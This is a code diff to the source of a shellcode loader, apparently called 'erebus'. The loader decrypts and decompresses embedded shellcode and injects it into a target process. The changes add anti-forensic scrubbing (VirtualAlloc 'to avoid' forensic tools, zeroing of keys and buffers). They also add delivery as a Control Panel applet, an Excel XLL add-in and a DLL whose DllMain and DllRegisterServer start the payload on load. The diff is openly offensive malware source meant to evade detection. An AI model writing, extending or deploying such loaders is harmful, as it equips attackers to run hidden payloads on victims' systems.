@@ -108,15 +108,16 @@ VOID entry(void)
 	// 3. Decompress shellcode if needed
 	// ============================================================
 
-	// Allocate writable memory for shellcode (original is read-only)
-	BYTE* shellcode_ptr = (BYTE*)malloc(shellcode_size);
+	// Allocate writable memory for shellcode via VirtualAlloc (avoids CRT heap
+	// metadata that leaks allocation size to forensic tools).
+	BYTE* shellcode_ptr = (BYTE*)VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!shellcode_ptr)
 	{
 		LOG_ERROR("Failed to allocate shellcode buffer");
 		return;
 	}
 	RtlCopyMemory(shellcode_ptr, shellcode, shellcode_size);
-	
+
 	BYTE* iv = nullptr;
 	SIZE_T iv_len = 0;
 	#if CONFIG_ENCRYPTION_TYPE == 4
@@ -127,49 +128,61 @@ VOID entry(void)
 	}
 	#endif
 
-	erebus::DecryptShellcodeWithKeyAndIv(&shellcode_ptr, &shellcode_size, key, sizeof(key), iv, iv_len);
+	// Decrypt with explicit key — key material is zeroed immediately after.
+	BYTE key_copy[sizeof(key)];
+	RtlCopyMemory(key_copy, key, sizeof(key));
+	erebus::DecryptShellcodeWithKeyAndIv(&shellcode_ptr, &shellcode_size, key_copy, sizeof(key_copy), iv, iv_len);
+	SecureZeroMemory(key_copy, sizeof(key_copy));
+
 	erebus::DecompressShellcode(&shellcode_ptr, &shellcode_size);
-	
+
 	if (shellcode_ptr == NULL || shellcode_size == 0)
 	{
 		LOG_ERROR("Shellcode processing failed - invalid result");
-		if (shellcode_ptr) free(shellcode_ptr);
+		if (shellcode_ptr) {
+			SecureZeroMemory(shellcode_ptr, shellcode_size);
+			VirtualFree(shellcode_ptr, 0, MEM_RELEASE);
+		}
 		return;
 	}
 
 	LOG_SUCCESS("Processed shellcode: %zu bytes", shellcode_size);
-	
+
 	// Execute injection
 	erebus::config.injection_method(shellcode_ptr, shellcode_size, process_handle, thread_handle);
 
-	LOG_SUCCESS("Final shellcode size: %zu bytes", shellcode_size);
-
-	// Cleanup
+	// Scrub the staging buffer — shellcode is now in the target process.
 	if (shellcode_ptr)
-		free(shellcode_ptr);
+	{
+		SecureZeroMemory(shellcode_ptr, shellcode_size);
+		VirtualFree(shellcode_ptr, 0, MEM_RELEASE);
+	}
 
 	return;
 }
 
-#if _RELEASE
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+#ifdef BUILD_DLL
+
+static BOOL entry_called = FALSE;
+
+static DWORD WINAPI EntryThread(LPVOID)
 {
 	entry();
 	return 0;
 }
-
-#elif _DEBUG && _WINDLL
-static BOOL entry_called = FALSE;
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 {
 	switch (ul_reason_for_call)
 	{
 	case DLL_PROCESS_ATTACH:
+		DisableThreadLibraryCalls(hModule);
 		if (!entry_called) {
-			entry();
 			entry_called = TRUE;
+			HANDLE hThread = CreateThread(NULL, 0, EntryThread, NULL, 0, NULL);
+			if (hThread) CloseHandle(hThread);
 		}
+		break;
 	case DLL_THREAD_ATTACH:
 	case DLL_THREAD_DETACH:
 	case DLL_PROCESS_DETACH:
@@ -181,8 +194,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 extern "C" __declspec(dllexport) HRESULT DllRegisterServer(void)
 {
 	if (!entry_called) {
-		entry();
 		entry_called = TRUE;
+		HANDLE hThread = CreateThread(NULL, 0, EntryThread, NULL, 0, NULL);
+		if (hThread) CloseHandle(hThread);
 	}
 	return S_OK;
 }
@@ -192,6 +206,111 @@ extern "C" __declspec(dllexport) HRESULT DllUnregisterServer(void)
 	return S_OK;
 }
 
+#elif defined(BUILD_CPL)
+
+// CPL message constants - defined inline to avoid cpl.h availability issues
+// with the MinGW cross-compiler toolchain.
+#define CPL_INIT      1
+#define CPL_GETCOUNT  2
+#define CPL_INQUIRE   3
+#define CPL_DBLCLK    5
+#define CPL_STOP      6
+#define CPL_EXIT      7
+
+// Payload thread handle kept alive so CPL_DBLCLK can wait on it.
+static HANDLE g_payload_thread = NULL;
+
+static DWORD WINAPI EntryThread(LPVOID)
+{
+	entry();
+	return 0;
+}
+
+// DllMain spawns the payload thread and retains the handle — it does NOT
+// close it.  Spawning here is safe: the thread is only *scheduled* inside
+// DllMain; it begins executing after DllMain returns and the loader lock is
+// released, so entry() can freely call CreateProcess, VirtualAllocEx, etc.
+// CplApplet(CPL_DBLCLK) then waits on the handle, which keeps the DLL
+// mapped until shellcode finishes and prevents the premature unload that
+// breaks async threads on Windows 11.
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+		DisableThreadLibraryCalls(hModule);
+		g_payload_thread = CreateThread(NULL, 0, EntryThread, NULL, 0, NULL);
+	}
+	return TRUE;
+}
+
+// CplApplet is the mandatory export that identifies this DLL as a Control Panel
+// applet.  For command-line invocation use:  control.exe payload.cpl,,0
+extern "C" __declspec(dllexport) LONG CplApplet(
+	HWND  hwndCpl,
+	UINT  uMsg,
+	LPARAM lParam1,
+	LPARAM lParam2)
+{
+	switch (uMsg)
+	{
+	case CPL_INIT:
+		return 1;
+
+	case CPL_GETCOUNT:
+		return 1;
+
+	case CPL_INQUIRE:
+		return 0;
+
+	case CPL_DBLCLK:
+		// Block here until the payload thread (started in DllMain) finishes.
+		// This prevents Control_RunDLL from calling CPL_STOP / FreeLibrary
+		// before shellcode has completed execution.
+		if (g_payload_thread) {
+			WaitForSingleObject(g_payload_thread, INFINITE);
+			CloseHandle(g_payload_thread);
+			g_payload_thread = NULL;
+		}
+		return 0;
+
+	case CPL_STOP:
+	case CPL_EXIT:
+	default:
+		return 0;
+	}
+}
+
+#elif defined(BUILD_XLL)
+
+// xlAutoOpen is the XLL registration callback - Excel calls it synchronously
+// after the add-in DLL is loaded.  Running entry() here keeps the DLL resident
+// for the full duration of shellcode setup; returning 1 signals success to Excel.
+extern "C" __declspec(dllexport) int WINAPI xlAutoOpen(void)
+{
+	entry();
+	return 1;
+}
+
+// xlAutoClose must be exported; called when the add-in is unloaded.  No-op.
+extern "C" __declspec(dllexport) int WINAPI xlAutoClose(void)
+{
+	return 1;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
+		DisableThreadLibraryCalls(hModule);
+	return TRUE;
+}
+
+#elif defined(NDEBUG)
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+{
+	entry();
+	return 0;
+}
+
 #else
 
 int main()
@@ -199,6 +318,5 @@ int main()
 	entry();
 	return 0;
 }
-
 
 #endif
